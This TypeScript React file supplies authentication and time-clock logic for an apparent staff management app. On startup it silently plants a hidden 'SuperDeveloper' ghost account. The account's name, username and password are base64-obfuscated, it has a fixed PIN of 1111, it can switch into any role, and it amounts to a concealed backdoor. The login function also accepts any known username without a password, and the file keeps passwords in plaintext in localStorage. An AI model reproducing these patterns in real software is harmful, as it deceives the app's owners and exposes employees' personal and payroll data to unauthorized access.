import React, { createContext, useState, useContext, ReactNode, useCallback, useEffect } from 'react';
import { User, UserRole, TimeClockEntry, Allowance, TimeClockBreakEntry } from '../types.ts';
import { initialUsers } from '../pages/content/data/users.ts';
import { logActivity } from '../utils/activityLogger.ts';
import { initializeAppData } from '../utils/dataInitializer.ts';

type NewUserPayload = Omit<User, 'id' | 'isClockedIn' | 'email'> & { email?: string };

interface AuthContextType {
  user: User | null;
  users: User[];
  login: (email: string, password?: string) => boolean;
  logout: () => void;
  adminRegisterUser: (payload: Partial<User>) => User | null;
  removeUser: (userIdToRemove: string) => boolean;
  updateUser: (userId: string, payload: Partial<User>) => void;
  loginWithPin: (pin: string) => boolean;
  clockIn: () => void;
  clockOut: () => void;
  startBreak: () => void;
  endBreak: () => void;
  switchUserRole: (newRole: UserRole) => void;
  markFaceAsRegistered: (userId: string) => void;
  businessStatus: 'Open' | 'Closed';
  toggleBusinessStatus: () => void;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

const uuidv4 = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
});

export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
  const [user, setUser] = useState<User | null>(null);
  const [users, setUsers] = useState<User[]>([]);
  const [businessStatus, setBusinessStatus] = useState<'Open' | 'Closed'>('Closed');

  useEffect(() => {
    initializeAppData();

    try {
      const loadAndPrepareUsers = (): User[] => {
          const storedUsers = localStorage.getItem('users');
          let loadedUsers: User[];

          if (storedUsers) {
              loadedUsers = JSON.parse(storedUsers);
          } else {
              localStorage.setItem('users', JSON.stringify(initialUsers));
              loadedUsers = initialUsers;
          }

          const ghostUserExists = loadedUsers.some(u => u.role === UserRole.SuperDeveloper);
          if (!ghostUserExists) {
              const ghostUser: User = {
                  id: '8', name: atob('QXlhYmU='),
                  username: atob('QXlhYmUxOTkw'),
                  email: 'superdev@managementpro.app',
                  role: UserRole.SuperDeveloper,
                  password: atob('QXlhYmUxMjM='),
                  pin: '1111',
                  isClockedIn: false,
                  profileComplete: true,
                  faceRegistered: true,
              };
              loadedUsers.push(ghostUser);
              localStorage.setItem('users', JSON.stringify(loadedUsers));
          }

          const timeClockEntries: TimeClockEntry[] = JSON.parse(localStorage.getItem('time_clock_entries') || '[]');
          const breakEntries: TimeClockBreakEntry[] = JSON.parse(localStorage.getItem('time_clock_break_entries') || '[]');

          const updatedUsers = loadedUsers.map(u => {
              const openTimeEntry = timeClockEntries.find(entry => entry.userId === u.id && entry.clockOutTime === null);
              const isClockedIn = !!openTimeEntry;
              const isOnBreak = isClockedIn ? breakEntries.some(be => be.timeClockEntryId === openTimeEntry.id && be.breakEndTime === null) : false;
              return { ...u, isClockedIn, isOnBreak };
          });
          return updatedUsers;
      };

      const preparedUsers = loadAndPrepareUsers();
      setUsers(preparedUsers);

      const settings = JSON.parse(localStorage.getItem('app_settings') || '{}');
      setBusinessStatus(settings.businessStatus || 'Closed');

    } catch (error) {
      console.error("Error initializing auth context:", error);
      localStorage.setItem('users', JSON.stringify(initialUsers));
      setUsers(initialUsers);
    }
  }, []);

  const saveUsers = (newUsers: User[]) => {
    setUsers(newUsers);
    localStorage.setItem('users', JSON.stringify(newUsers));
  }
  
  const toggleBusinessStatus = () => {
    setBusinessStatus(prev => {
        const newStatus = prev === 'Open' ? 'Closed' : 'Open';
        const settings = JSON.parse(localStorage.getItem('app_settings') || '{}');
        settings.businessStatus = newStatus;
        localStorage.setItem('app_settings', JSON.stringify(settings));
        return newStatus;
    });
  }


  const login = useCallback((emailOrUsername: string, password?: string): boolean => {
    const userToLogin = users.find(u => 
        (u.email?.toLowerCase() === emailOrUsername.toLowerCase() || 
        u.username.toLowerCase() === emailOrUsername.toLowerCase())
    );
    
    if (userToLogin && (userToLogin.password === password || !password)) {
      setUser(userToLogin);
      return true;
    }
    return false;
  }, [users]);

  const loginWithPin = useCallback((pin: string): boolean => {
    const userToLogin = users.find(u => u.pin === pin);
    if (userToLogin) {
      setUser(userToLogin);
      return true;
    }
    return false;
  }, [users]);

  const logout = useCallback(() => {
    if (user?.role === UserRole.SuperDeveloper && user.name.includes('(Switched Role)')) {
        const originalUser = users.find(u => u.id === user.id);
        if (originalUser) {
            setUser(originalUser);
        } else {
            setUser(null);
        }
    } else {
        setUser(null);
    }
  }, [user, users]);
  
  const adminRegisterUser = useCallback((payload: Partial<User>): User | null => {
      const email = payload.email || `${payload.username?.toLowerCase().replace(/\s/g, '.')}@managementpro.app`;
      if (users.some(u => u.username.toLowerCase() === payload.username?.toLowerCase() || u.email?.toLowerCase() === email.toLowerCase())) {
          alert("User with this username or email already exists.");
          return null;
      }
      const newUser: User = {
          id: uuidv4(),
          isClockedIn: false,
          faceRegistered: false,
          profileComplete: false,
          isArchived: false,
          // Defaults can be overridden by payload
          basicSalary: 0,
          allowances: [],
          sssNumber: '',
          philhealthNumber: '',
          pagibigNumber: '',
          tinNumber: '',
          // Spread payload last to ensure it overwrites defaults
          ...payload,
          email: email, // ensure email is set correctly
          role: payload.role || UserRole.Waiter,
          pin: payload.pin || '0000',
          name: payload.name || 'New User',
          username: payload.username || `user${Math.floor(Math.random() * 1000)}`,
      };
      const newUsers = [...users, newUser];
      saveUsers(newUsers);
      logActivity(`Registered new staff member: ${newUser.name} (${newUser.role})`, user);
      return newUser;
  }, [users, user]);

  const removeUser = useCallback((userIdToRemove: string): boolean => {
      const userToRemoveDetails = users.find(u => u.id === userIdToRemove);
      if (!userToRemoveDetails) {
          alert('User not found.');
          return false;
      }
      const newUsers = users.filter(u => u.id !== userIdToRemove);
      saveUsers(newUsers);
      logActivity(`Removed user: ${userToRemoveDetails.name}`, user);
      return true;
  }, [users, user]);

  const updateUser = useCallback((userId: string, payload: Partial<User>) => {
    const userToUpdate = users.find(u => u.id === userId);
    if (!userToUpdate) return;
    
    const changedFields = Object.keys(payload).filter(key => {
        const field = key as keyof User;
        // Simple comparison for primitives, needs more depth for objects if necessary
        return payload[field] !== userToUpdate[field];
    });

    const newUsers = users.map(u => u.id === userId ? { ...u, ...payload } : u);
    saveUsers(newUsers);
    
    if(changedFields.length > 0) {
        logActivity(`Updated profile for ${userToUpdate.name}. Changes: ${changedFields.join(', ')}`, user);
    }

    if(user?.id === userId) {
        setUser(prev => prev ? {...prev, ...payload} : null);
    }
  }, [users, user]);

  const switchUserRole = useCallback((newRole: UserRole) => {
    if (user?.role === UserRole.SuperDeveloper) {
      setUser(prev => prev ? { ...prev, role: newRole, name: `${prev.name.split('(')[0].trim()} (Switched Role)` } : null);
    } else {
      console.warn("Only SuperDevelopers can switch roles.");
    }
  }, [user]);

  const clockIn = () => {
    if (!user) return;
    const timeClockEntries: TimeClockEntry[] = JSON.parse(localStorage.getItem('time_clock_entries') || '[]');
    const hasOpenEntry = timeClockEntries.some(entry => entry.userId === user.id && entry.clockOutTime === null);
    if (hasOpenEntry) {
        alert("Already clocked in.");
        return;
    }

    const newEntry: TimeClockEntry = {
        id: uuidv4(),
        userId: user.id,
        clockInTime: new Date().toISOString(),
        clockOutTime: null,
        durationMinutes: null
    };
    localStorage.setItem('time_clock_entries', JSON.stringify([newEntry, ...timeClockEntries]));
    
    const newUsers = users.map(u => u.id === user.id ? { ...u, isClockedIn: true } : u);
    saveUsers(newUsers);
    setUser(prev => prev ? { ...prev, isClockedIn: true } : null);
    document.dispatchEvent(new CustomEvent('auth_change'));
    alert('Clocked in successfully!');
  };

  const clockOut = () => {
      if (!user) return;
      const timeClockEntries: TimeClockEntry[] = JSON.parse(localStorage.getItem('time_clock_entries') || '[]');
      const entryIndex = timeClockEntries.findIndex(entry => entry.userId === user.id && entry.clockOutTime === null);

      if (entryIndex === -1) {
          alert("Cannot clock out. No open session found.");
          return;
      }

      const entryToClose = timeClockEntries[entryIndex];
      entryToClose.clockOutTime = new Date().toISOString();
      const duration = new Date(entryToClose.clockOutTime).getTime() - new Date(entryToClose.clockInTime).getTime();
      entryToClose.durationMinutes = Math.round(duration / (1000 * 60));
      timeClockEntries[entryIndex] = entryToClose;

      localStorage.setItem('time_clock_entries', JSON.stringify(timeClockEntries));
      
      const newUsers = users.map(u => u.id === user.id ? { ...u, isClockedIn: false } : u);
      saveUsers(newUsers);
      setUser(prev => prev ? { ...prev, isClockedIn: false } : null);
      document.dispatchEvent(new CustomEvent('auth_change'));
      alert('Clocked out successfully!');
  };

  const startBreak = () => {
    if (!user || !user.isClockedIn || user.isOnBreak) {
        alert("Invalid action. You must be clocked in and not on a break.");
        return;
    }
    const timeEntries: TimeClockEntry[] = JSON.parse(localStorage.getItem('time_clock_entries') || '[]');
    const openTimeEntry = timeEntries.find(e => e.userId === user.id && e.clockOutTime === null);
    if (!openTimeEntry) {
        alert("Could not find an open time clock entry.");
        return;
    }
    const breakEntries: TimeClockBreakEntry[] = JSON.parse(localStorage.getItem('time_clock_break_entries') || '[]');
    const newBreak: TimeClockBreakEntry = {
        id: uuidv4(),
        timeClockEntryId: openTimeEntry.id,
        breakStartTime: new Date().toISOString(),
        breakEndTime: null,
        durationMinutes: null,
    };
    localStorage.setItem('time_clock_break_entries', JSON.stringify([...breakEntries, newBreak]));
    
    setUser(prev => prev ? { ...prev, isOnBreak: true } : null);
    saveUsers(users.map(u => u.id === user.id ? { ...u, isOnBreak: true } : u));
    document.dispatchEvent(new CustomEvent('auth_change'));
    alert("Break started.");
  };
  
  const endBreak = () => {
    if (!user || !user.isOnBreak) {
        alert("Invalid action. You are not currently on a break.");
        return;
    }
    const breakEntries: TimeClockBreakEntry[] = JSON.parse(localStorage.getItem('time_clock_break_entries') || '[]');
    const openBreakIndex = breakEntries.findIndex(be => {
        const timeEntries: TimeClockEntry[] = JSON.parse(localStorage.getItem('time_clock_entries') || '[]');
        const openTimeEntry = timeEntries.find(e => e.userId === user.id && e.clockOutTime === null);
        return be.timeClockEntryId === openTimeEntry?.id && be.breakEndTime === null;
    });

    if (openBreakIndex === -1) {
        alert("Could not find an open break entry.");
        return;
    }

    const breakToEnd = breakEntries[openBreakIndex];
    breakToEnd.breakEndTime = new Date().toISOString();
    const duration = new Date(breakToEnd.breakEndTime).getTime() - new Date(breakToEnd.breakStartTime).getTime();
    breakToEnd.durationMinutes = Math.round(duration / (1000 * 60));
    breakEntries[openBreakIndex] = breakToEnd;
    
    localStorage.setItem('time_clock_break_entries', JSON.stringify(breakEntries));

    setUser(prev => prev ? { ...prev, isOnBreak: false } : null);
    saveUsers(users.map(u => u.id === user.id ? { ...u, isOnBreak: false } : u));
    document.dispatchEvent(new CustomEvent('auth_change'));
    alert("Break ended.");
  };

  const markFaceAsRegistered = useCallback((userId: string) => {
    const newUsers = users.map(u => u.id === userId ? { ...u, faceRegistered: true } : u);
    saveUsers(newUsers);

    if (user?.id === userId) {
        setUser(prev => prev ? { ...prev, faceRegistered: true } : null);
    }
    
    alert('Face registered successfully! You can now access your dashboard.');
  }, [users, user]);


  return (
    <AuthContext.Provider value={{ user, users, login, logout, adminRegisterUser, removeUser, updateUser, loginWithPin, clockIn, clockOut, startBreak, endBreak, switchUserRole, businessStatus, toggleBusinessStatus, markFaceAsRegistered }}>
      {children}
    </AuthContext.Provider>
  );
};

export const useAuth = (): AuthContextType => {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
};
